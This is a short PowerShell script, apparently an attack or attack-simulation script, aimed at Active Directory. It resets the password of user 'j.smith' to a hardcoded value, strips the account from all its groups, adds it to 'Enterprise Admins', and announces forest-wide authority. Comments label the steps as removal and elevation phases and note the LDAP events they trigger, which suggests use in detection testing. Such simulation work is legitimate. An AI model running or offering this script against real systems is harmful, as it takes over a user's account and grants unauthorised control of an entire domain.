# Configuration
$TargetUser = "j.smith"
$HighPrivGroup = "Enterprise Admins"

net user $TargetUser "Coffe123!"

# Identify all current group memberships (excluding the mandatory 'Domain Users')
$CurrentGroups = Get-ADPrincipalGroupMembership -Identity $TargetUser | Where-Object { $_.Name -ne "Domain Users" }

Write-Host "[*] Stripping $TargetUser of existing roles..." -ForegroundColor Yellow

# Removal Phase: Triggers multiple LDAP 'modify' requests
foreach ($Group in $CurrentGroups) {
    Remove-ADGroupMember -Identity $Group -Members $TargetUser -Confirm:$false
    Write-Host "[-] Removed from: $($Group.Name)"
}

Write-Host "[*] Promoting $TargetUser to $HighPrivGroup..." -ForegroundColor Cyan

# Elevation Phase: The 'End Game' network event
Add-ADGroupMember -Identity $HighPrivGroup -Members $TargetUser

Write-Host "[!] SUCCESS: j.smith now has Forest-Wide Authority." -ForegroundColor White -BackgroundColor Red